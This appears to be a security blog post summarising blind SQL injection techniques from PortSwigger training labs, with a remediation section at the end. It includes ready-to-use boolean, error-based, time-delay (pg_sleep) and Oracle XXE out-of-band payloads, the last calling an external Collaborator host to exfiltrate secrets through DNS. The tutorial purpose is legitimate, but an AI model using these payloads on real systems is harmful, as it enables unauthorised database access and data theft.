---
title: "Blind SQL injection: the five oracles"
date: 2026-07-05 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, boolean-based, error-based, time-based, out-of-band, oast, postgresql, oracle]
description: "A map of the blind SQL injection labs in this series. When the query result never reaches the page, you fall back to an oracle — a side channel that leaks one bit at a time, or sends the answer out-of-band entirely. This post lays out the five oracle flavours, how to pick the right one by what the app leaks, and links each to its walkthrough."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection — the five oracles
---

## Overview

"Blind" [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) means the injection point is real but the **query result never reaches the page**. You cannot read data directly — typical with an unreflected input like a `TrackingId` cookie. The way through is always the same shape: find an **oracle**, a side channel that answers one yes/no question per request, then binary-search any value out of the database one bit at a time.

There are five oracle flavours. The first four drive the *same* extraction loop — `LENGTH(password)`, then `ASCII(SUBSTRING(password, i, 1))`, binary-searched 32–126 at ~7 requests per character — and **the only thing that changes is how you read the answer bit.** The fifth, out-of-band, is the odd one out: when the app leaks *nothing* in-band, you make the database server itself phone home and read the answer off your own infrastructure. This post is the map; each row links to a full walkthrough.

## Pick the oracle by what the app leaks

| What the app leaks on TRUE vs FALSE | Oracle | How you read the bit | Walkthrough |
|---|---|---|---|
| A visible message appears / disappears | **Boolean** | "Welcome back" present = TRUE | [Conditional responses]({% post_url 2026-06-30-Blind-SQL-injection-with-conditional-responses %}) |
| An unhandled DB error toggles the HTTP status | **Error (status)** | HTTP 500 = TRUE, 200 = FALSE | [Conditional errors]({% post_url 2026-07-01-Blind-SQL-injection-with-conditional-errors %}) |
| The raw DB error text is shown to the client | **Visible error** | Read the value *out of the error string* | [Visible error-based]({% post_url 2026-07-02-Visible-error-based-SQL-injection %}) |
| Nothing — no message, no error, no status change | **Time** | A slow response = TRUE | [Time delays]({% post_url 2026-07-03-Blind-SQL-injection-with-time-delays %}) / [time delays + retrieval]({% post_url 2026-07-04-Blind-SQL-injection-with-time-delays-and-information-retrieval %}) |
| Nothing in-band, but the DB can reach the network | **Out-of-band (OAST)** | A DNS lookup lands at *your* server = it ran | [Out-of-band interaction]({% post_url 2026-07-06-Blind-SQL-injection-with-out-of-band-interaction %}) |

Read the table top-down — it is ordered from the most informative leak to the least. Prefer the highest oracle the app gives you: visible-error reads a whole value in **one** request; the boolean/error/time channels infer one bit at a time. Time-based is the universal *in-band* fallback because it needs nothing but the ability to make the database wait — and when even time fails (the app hides every response difference), out-of-band is the last resort, reading the signal off a DNS lookup instead of the HTTP response.

## The five oracles in one line each

- **Boolean (conditional responses).** A matching row renders a side effect (a "Welcome back" banner); no match renders nothing. Confirm with `' AND '1'='1` vs `' AND '1'='2`, then binary-search with the message as the truth signal.
- **Error toggle (conditional errors).** No message, but forcing a database error only on the TRUE branch changes the status. The classic primitive is a division-by-zero inside a `CASE` — Oracle `TO_CHAR(1/0)`, Postgres `CAST(... AS int)` on `1/0` — read HTTP 500 = TRUE.
- **Visible error (verbose errors).** The strongest case: the app ships the DBMS error text to the browser, so a type-conversion error like Postgres `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` drops the password straight into `invalid input syntax for type integer: "..."`. No binary search needed.
- **Time (delays).** Nothing leaks at all, so make the database stall on command: `'||pg_sleep(10)--` to confirm, or wrap the guess in `CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END` and treat a slow response as TRUE to extract.
- **Out-of-band (OAST).** Even time fails — the app hides every response difference. So you stop reading the response entirely and make the database server perform a DNS lookup to a host you control. On Oracle, an XMLType external-entity (XXE) payload `EXTRACTVALUE(xmltype('...<!ENTITY % remote SYSTEM "http://SUB.oastify.com/"> %remote;...'),'/l')` fires the lookup the instant the SQL parses; the interaction landing in your Collaborator is the proof. Concatenate the secret into the subdomain to exfiltrate it. Watch the cookie encoding — the `TrackingId` value is URL-decoded server-side, so the payload must be sent URL-encoded (`%25` for the literal `%`), or it breaks into an HTTP 500 and never parses.

## Two gotchas worth carrying between labs

- **`--` comment spacing.** MSSQL accepts a bare `--`, but MySQL requires a trailing whitespace — URL-encode as `--+-` or use `#`/`%23`, or the query errors.
- **The cookie semicolon trap.** When a *stacked* time payload (`x'; SELECT CASE ...`) goes in a **cookie**, a raw `;` is parsed as a cookie *separator* and silently truncates your payload to everything before it — every probe then reads FALSE. URL-encode it as `%3b`; the app URL-decodes the cookie back to a real `;` before it reaches SQL.

## The fix is the same for all five

Every one of these oracles exists because user input becomes part of the SQL text. The fix is not oracle-specific:

- **Parameterized queries / prepared statements** — bind every input as data so it can never change the query. This is the only real fix and it closes all five oracles at once.
- **Generic error pages** — never return raw DBMS errors to the client (this specifically kills the error-status and visible-error channels, and is also [CWE-209](https://cwe.mitre.org/data/definitions/209.html)).
- **Least privilege** so a successful injection reaches as little as possible, and **statement timeouts/monitoring** so a query that sleeps for seconds on a millisecond request raises an alert.
- **Block outbound egress from the database server** and **disable external-entity resolution** in its XML parser, so even a residual injection cannot phone home — this is what shuts the out-of-band channel.
